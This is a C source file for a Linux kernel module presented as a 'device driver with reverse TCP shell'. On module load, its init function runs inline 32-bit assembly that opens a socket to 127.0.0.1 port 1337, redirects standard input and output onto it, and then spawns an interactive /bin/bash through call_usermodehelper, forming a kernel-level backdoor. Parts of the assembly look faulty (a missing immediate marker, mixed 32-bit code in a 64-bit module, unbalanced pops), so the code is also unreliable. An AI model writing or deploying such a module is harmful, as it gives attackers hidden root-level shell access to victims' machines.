
#include "reverseTCP.h"

MODULE_LICENSE("GPL");            
MODULE_AUTHOR("Jorge Lima");    
MODULE_DESCRIPTION("device driver with reverse TCP shell");  
MODULE_VERSION("1.0");            

//file operations for driver
static struct file_operations reverseTCP_fops =
{
   .open = reverseTCP_open,
   .release = reverseTCP_release, 
   .unlocked_ioctl = reverseTCP_ioctl,
};

//==============================
//=====> init function <========
//==============================
static int __init reverseTCP_init(void){
   printk(KERN_ALERT "reverseTCP: Initializing driver\n");

   //get major number
   major_number = register_chrdev(0, DEVICE_NAME, &reverseTCP_fops);
   if (major_number<0){
      printk(KERN_ALERT "reverseTCP: failed to register a major number\n");
      major_number = -1;
      return major_number;
   }
   printk(KERN_ALERT "reverseTCP: driver registered with major number %d\n", major_number);

   // Register device class
   reverseTCP_class = class_create(THIS_MODULE, CLASS_NAME);
   if (IS_ERR(reverseTCP_class)){                
      unregister_chrdev(major_number, DEVICE_NAME);
      printk(KERN_ALERT "reverseTCP: failed to register device class\n");
      return PTR_ERR(reverseTCP_class);          
   }
   printk(KERN_ALERT "reverseTCP: device class registered\n");

   // Register the device driver
   reverseTCP_device = device_create(reverseTCP_class, NULL, MKDEV(major_number, 0), NULL, DEVICE_NAME);
   if (IS_ERR(reverseTCP_device)){               
      class_destroy(reverseTCP_class);
      unregister_chrdev(major_number, DEVICE_NAME);
      printk(KERN_ALERT "reverseTCP: failed to create the device\n");
      return PTR_ERR(reverseTCP_device);
   }
   printk(KERN_ALERT "reverseTCP: device class created correctly\n");


   printk(KERN_ALERT "reverseTCP: calling reverseTCP_connect\n");
   reverseTCP_connect();
   printk(KERN_ALERT "reverseTCP: no hickupp!!!!\n");


   return 0;
}


//=========================
//=====> exit device <=====
//=========================
static void __exit reverseTCP_exit(void){
   device_destroy(reverseTCP_class, MKDEV(major_number, 0));     
   class_unregister(reverseTCP_class);                          
   class_destroy(reverseTCP_class);                             
   unregister_chrdev(major_number, DEVICE_NAME);             
   printk(KERN_ALERT "reverseTCP: device driver removed from kernel\n");
}


//==================================
//=====> device open function <=====
//==================================
static int reverseTCP_open(struct inode *inodep, struct file *filep){
   if(!reverseTCP_mutex)reverseTCP_mutex++;//lock devise reverseTCP_mutex
   num_of_dev_open++;
   printk(KERN_ALERT "reverseTCP: device opened\n");
   return 0;
}


//============================
//=====> device release <=====
//============================
static int reverseTCP_release(struct inode *inodep, struct file *filep){
   if(reverseTCP_mutex)reverseTCP_mutex--;
   num_of_dev_open--;
   printk(KERN_ALERT "reverseTCP: device closed\n");
   (reverseTCP_mutex < 1) ? printk(KERN_ALERT "reverseTCP: mutex free\n") : printk(KERN_ALERT "reverseTCP: mutex locked\n");
   return 0;
}

//==========================
//=====> device ioctl <=====
//==========================
/*
 * ioctl has 2 commads, and always gets passed a NULL argument
 * DEVICE_IN_USE_IOCTL checks the status of the reverseTCP_mutex
 * NUMBER_OF_DEVICES_IOCTL returns the number of process using the devise, starting at 0 if 1 is using it, if unused -1
 */
static long    reverseTCP_ioctl (struct file *filp, unsigned int cmd, unsigned long arg){
    char ret = 0;
    switch(cmd){
        case DEVICE_IN_USE_IOCTL:
            ret = reverseTCP_mutex;
            break;
        case NUMBER_OF_DEVICES_IOCTL:
            ret = num_of_dev_open;
            break;
        default:
            ret = -1;
            break;
    }
    
    return ret;
}


//=========================
//=====> reverse tcp <=====
//=========================


//reverse shell
static int reverseTCP_connect(void)
{
	struct subprocess_info *sub_info;
	static  char *argv[] = { "/bin/bash", "-i", NULL};    
    static  char *envp[] = {"HOME=/", "TERM=linux", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL};
	
   //########## assembly magic, create socket and connect using userspace calls in the kernel  ###############
    mm_segment_t saved_fs = get_fs();//to change address space to user space.
  	set_fs(get_ds());

  	__asm__ __volatile__ (
  		"push %rax;"
  		"push %rbx;"
  		"push %rcx;"
  		"push %rdx;"
  		"push %rsp;"


  		".code32;"//this program is on 32 assembly
  		//create the socket
    	"push $0x66;"
    	"pop %eax;"//syscall #102, sys_socketcall.
    	"push $0x01;"
    	"pop %ebx;"//fisrt argument to sys_socketcall, 0x1 for socket fucntion socket(), the following are its parameters.
    	"xor %edx,%edx;"
    	"push %edx;"//protocol -> IPPROTO_IP (IP protocol selected with value 0).
    	"push %ebx;"//type of socket -> SOCK_STREAM.
    	"push $0x02;"//AF_INET socket.
    	"movl %esp,%ecx;"//save pointer to arguments fo socket().
    	"int $0x80;"//interrupt 80, make syscall sys_socketcall.//socket created.
    	"movl %eax,%edx;"//save socket file descritor returned from socket(), will use for dup2().

    	//connect to IP=127.0.0.1 and port 1337.
    	"movl $0x66,%eax;"//for sys_socketcall again.
    	"push $0x0101017f;"//push IP to stack in reverse order, 1 byte per octate, no dots.
    	"push 0x3905;"//port number 1337.
    	"movl $0x02,%ebx;"//sin_family AF_INET -> equivalent to 2.
    	"push %ebx;"
    	"movl %esp,%ecx;"//save pointer to arguments.
    	"movl $0x03,%ebx;"//register ebx=3 will be the first argument to sys_socketcall, this is function connect().
    	"int $0x80;"//interrupt 80, call sys_socketcall to run connect().

    	//redirect stdin, stdout, stderr to socket with dup2().
    	"push $0x2;"
    	"pop %ecx;"//ecx is the loop counter.
    	"movl %edx,%ebx;"//get the socket file descriptor saved in edx from socket() call and put it on ebx.
    	//ebx is first argument to dup2(), ecx is the second.
    	"loop:;"
    	"movl $0x3f,%eax;"//syscall number for dup2().
    	"int $0x80;"
    	"dec %ecx;"//ecx will be 2,1,0, the values for the stderr,stdout,stdin.
    	"jns loop;"

    	/*
    	//spawning the shell (/bin/bash) with execve().
    	"movl $0x0b, %eax;"//putting syscall number 0x0b on eax for sys_execve().
    	"xor %ecx,%ecx;"
    	"xor %edx,%edx;"
    	"push $0x00006873;"// 0hs of the /bin//bash.
    	"push $0x61622727;"//ab// of the /bin//bash.
    	"push $0x6e69622f;"//nib/ of /bin/bash.
    	"movl %esp,%ebx;"//save the pointer to the file name.
    	"int $0x80;"//call sys_execve().
		*/
		
    	"pop %ebx;"
    	"pop %ebx;"
    	"pop %ebx;"
    	"pop %ebx;"
    	"pop %ebx;"
    	"pop %ebx;"
    	

    	".code64;"//return back to 64bit
    	
    	"pop %rsp;"
    	"pop %rdx;"	
    	"pop %rdx;"
    	"pop %rcx;"
    	"pop %rbx;"
    	"pop %rax;"	
    	
    );
    set_fs(saved_fs);
    
    sub_info = call_usermodehelper_setup( argv[0], argv, envp, GFP_ATOMIC, NULL, NULL, NULL );
  	if (sub_info == NULL) return -ENOMEM;
 	
  	return call_usermodehelper_exec( sub_info, UMH_NO_WAIT );
}



module_init(reverseTCP_init);
module_exit(reverseTCP_exit);
